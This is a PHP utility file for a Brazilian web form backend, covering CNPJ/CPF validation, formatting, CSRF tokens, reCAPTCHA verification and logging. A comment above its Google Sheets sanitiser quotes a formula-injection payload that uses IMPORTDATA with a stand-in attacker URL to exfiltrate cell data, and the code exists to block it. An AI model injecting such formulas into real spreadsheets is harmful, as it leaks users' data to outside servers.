<?php
/**
 * Funções Auxiliares
 * 
 * Conjunto de funções utilitárias usadas em toda a aplicação.
 */

/**
 * Sanitiza string removendo caracteres especiais
 */
function sanitizeString($string) {
    return htmlspecialchars(strip_tags(trim($string)), ENT_QUOTES, 'UTF-8');
}

/**
 * Valida formato de CNPJ
 */
function isValidCNPJ($cnpj) {
    $cnpj = preg_replace('/[^0-9]/', '', $cnpj);
    
    if (strlen($cnpj) != 14) {
        return false;
    }
    
    // Verifica se todos os dígitos são iguais
    if (preg_match('/(\d)\1{13}/', $cnpj)) {
        return false;
    }
    
    // Validação dos dígitos verificadores
    $sum = 0;
    $weights = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
    
    for ($i = 0; $i < 12; $i++) {
        $sum += $cnpj[$i] * $weights[$i];
    }
    
    $remainder = $sum % 11;
    $digit1 = $remainder < 2 ? 0 : 11 - $remainder;
    
    if ($cnpj[12] != $digit1) {
        return false;
    }
    
    $sum = 0;
    $weights = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
    
    for ($i = 0; $i < 13; $i++) {
        $sum += $cnpj[$i] * $weights[$i];
    }
    
    $remainder = $sum % 11;
    $digit2 = $remainder < 2 ? 0 : 11 - $remainder;
    
    return $cnpj[13] == $digit2;
}

/**
 * Formata CNPJ para exibição
 */
function formatCNPJ($cnpj) {
    $cnpj = preg_replace('/[^0-9]/', '', $cnpj);
    return preg_replace('/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/', '$1.$2.$3/$4-$5', $cnpj);
}

/**
 * Valida formato de email
 */
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Valida formato de telefone brasileiro
 */
function isValidPhone($phone) {
    $phone = preg_replace('/[^0-9]/', '', $phone);
    return strlen($phone) >= 10 && strlen($phone) <= 11;
}

/**
 * Formata telefone para exibição
 */
function formatPhone($phone) {
    $phone = preg_replace('/[^0-9]/', '', $phone);
    
    if (strlen($phone) == 11) {
        return preg_replace('/(\d{2})(\d{5})(\d{4})/', '($1) $2-$3', $phone);
    } elseif (strlen($phone) == 10) {
        return preg_replace('/(\d{2})(\d{4})(\d{4})/', '($1) $2-$3', $phone);
    }
    
    return $phone;
}

/**
 * Gera um nome único para arquivo
 */
function generateUniqueFileName($originalName) {
    $extension = pathinfo($originalName, PATHINFO_EXTENSION);
    $filename = pathinfo($originalName, PATHINFO_FILENAME);
    $filename = preg_replace('/[^a-zA-Z0-9_-]/', '', $filename);
    return $filename . '_' . uniqid() . '_' . time() . '.' . $extension;
}

/**
 * Valida tipo de arquivo
 */
function isAllowedFileType($filename) {
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($extension, ALLOWED_FILE_TYPES);
}

/**
 * Converte bytes para formato legível
 */
function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

/**
 * Retorna resposta JSON
 */
function jsonResponse($data, $statusCode = 200) {
    http_response_code($statusCode);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
    exit;
}

/**
 * Loga erro em arquivo
 */
function logError($message, $context = []) {
    $logDir = __DIR__ . '/../../logs/';
    
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }
    
    $logFile = $logDir . 'error_' . date('Y-m-d') . '.log';
    $timestamp = date('Y-m-d H:i:s');
    $contextStr = !empty($context) ? json_encode($context, JSON_UNESCAPED_UNICODE) : '';
    $logMessage = "[$timestamp] $message $contextStr" . PHP_EOL;
    
    file_put_contents($logFile, $logMessage, FILE_APPEND);
}

/**
 * Gera token CSRF
 */
function generateCSRFToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * Valida token CSRF
 */
function validateCSRFToken($token) {
    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
}

/**
 * Valida CPF (dígitos verificadores)
 */
function isValidCPF($cpf) {
    $cpf = preg_replace('/[^0-9]/', '', $cpf);
    if (strlen($cpf) != 11 || preg_match('/^(\d)\1{10}$/', $cpf)) {
        return false;
    }
    for ($t = 9; $t < 11; $t++) {
        $sum = 0;
        for ($i = 0; $i < $t; $i++) {
            $sum += (int)$cpf[$i] * (($t + 1) - $i);
        }
        $digit = ((10 * $sum) % 11) % 10;
        if ((int)$cpf[$t] !== $digit) {
            return false;
        }
    }
    return true;
}

/**
 * Valida CNPJ ou CPF conforme o tamanho
 */
function isValidCNPJOrCPF($documento) {
    $digitos = preg_replace('/[^0-9]/', '', $documento);
    if (strlen($digitos) == 11) {
        return isValidCPF($digitos);
    }
    if (strlen($digitos) == 14) {
        return isValidCNPJ($digitos);
    }
    return false;
}

/**
 * Sanitiza valor que será gravado em célula do Google Sheets (anti-injeção de fórmula)
 *
 * A planilha recebe os dados com valueInputOption USER_ENTERED, que interpreta
 * como fórmula qualquer célula iniciada por '=', '+', '-', '@', tab ou CR.
 * Um atacante poderia gravar algo como '=IMPORTDATA("https://evil.tld/x")' no
 * campo "nome completo" e, ao recalcular, a planilha exfiltraria para um servidor
 * externo o conteúdo das células (IMPORTDATA/IMPORTXML etc.). Prefixar uma
 * aspa simples (') força o Sheets a tratar o conteúdo como texto puro.
 */
function sanitizeSheetsValue(string $value): string {
    $primeiro = mb_substr($value, 0, 1);
    if ($primeiro === '=' || $primeiro === '+' || $primeiro === '-' || $primeiro === '@' || $primeiro === "\t" || $primeiro === "\r") {
        return "'" . $value;
    }
    return $value;
}

/**
 * Verifica reCAPTCHA v3 no servidor (fail-closed: em caso de dúvida, rejeita)
 */
function verifyRecaptcha($token, $scoreMinimo = 0.5) {
    $token = trim((string)$token);
    if ($token === '') {
        return false;
    }
    $secret = defined('RECAPTCHA_SECRET_KEY') ? RECAPTCHA_SECRET_KEY : '';
    if ($secret === '') {
        return false;
    }
    $endpoint = 'https://www.google.com/recaptcha/api/siteverify';
    $payload = http_build_query(['secret' => $secret, 'response' => $token]);
    $raw = false;
    if (function_exists('curl_init')) {
        $ch = curl_init($endpoint);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_TIMEOUT => 10,
        ]);
        $raw = curl_exec($ch);
        curl_close($ch);
    } else {
        $context = stream_context_create(['http' => [
            'method' => 'POST',
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => $payload,
            'timeout' => 10,
        ]]);
        $raw = @file_get_contents($endpoint, false, $context);
    }
    if ($raw === false) {
        return false;
    }
    $result = json_decode($raw);
    if (!is_object($result) || empty($result->success)) {
        return false;
    }
    if (isset($result->score) && (float)$result->score < $scoreMinimo) {
        return false;
    }

    // Action: o token precisa ter sido gerado com a mesma action do formulário
    // (grecaptcha.execute(RECAPTCHA_SITE_KEY, { action: 'submit' }) no form.js)
    if (!isset($result->action) || $result->action !== 'submit') {
        return false;
    }

    // Hostname: se informado pelo Google, o token só é válido se tiver sido
    // gerado no host da aplicação (APP_URL). Em produção o Host da requisição
    // (HTTP_HOST) NÃO é aceito como alternativa porque é um cabeçalho
    // controlável pelo cliente; ele só entra na lista fora da produção para
    // não quebrar o ambiente local (php -S / localhost).
    if (isset($result->hostname)) {
        $hostsValidos = [];
        if (defined('APP_URL')) {
            $hostAppUrl = parse_url(APP_URL, PHP_URL_HOST);
            if (is_string($hostAppUrl) && $hostAppUrl !== '') {
                $hostsValidos[] = strtolower($hostAppUrl);
            }
        }
        $ambienteProd = (defined('APP_ENV') && APP_ENV === 'production');
        if (!$ambienteProd && !empty($_SERVER['HTTP_HOST'])) {
            $hostsValidos[] = strtolower((string)$_SERVER['HTTP_HOST']);
        }
        if (!in_array(strtolower((string)$result->hostname), $hostsValidos, true)) {
            return false;
        }
    }

    return true;
}

/**
 * Log estruturado de auditoria/integração em JSONL (nunca interrompe o fluxo)
 */
function logIntegration($evento, array $dados = []) {
    $logDir = __DIR__ . '/../../logs/';
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0755, true);
    }
    $registro = [
        'timestamp' => date('c'),
        'evento' => $evento,
        'dados' => $dados,
    ];
    @file_put_contents(
        $logDir . 'integrations-' . date('Y-m-d') . '.jsonl',
        json_encode($registro, JSON_UNESCAPED_UNICODE | JSON_PARTIAL_OUTPUT_ON_ERROR) . PHP_EOL,
        FILE_APPEND
    );
}
